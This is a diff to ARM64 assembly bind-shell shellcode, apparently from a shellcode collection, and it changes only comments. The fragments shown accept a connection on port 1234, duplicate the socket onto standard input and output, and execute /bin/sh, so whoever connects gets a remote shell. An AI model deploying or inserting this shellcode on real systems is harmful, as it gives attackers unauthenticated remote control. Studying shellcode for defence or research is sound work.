@@ -5,6 +5,7 @@
   http://modexp.wordpress.com/   
 */
 
+// 136 bytes
     .global _start
     .text
 
@@ -37,7 +38,7 @@ _start:
     mov    x8, #202      // x8 = accept    
     svc    0    
     
-    mov    x6, x0        // x7 = r
+    mov    x6, x0        // x6 = r
     
     // dup2(r, FILENO_STDIN);
     // dup2(r, FILENO_STDOUT);
@@ -56,8 +57,8 @@ dup_loop:
     mov    x8, #221      // x8 = execve
     svc    0
 sin_port:    
-    .word  0xd2040002
-    .word  0x00000000 
+    .word  0xd2040002    // 1234, AF_INET
+    .word  0x00000000    // INADDR_ANY
 sh:    
     .ascii "/bin/sh\0"
 
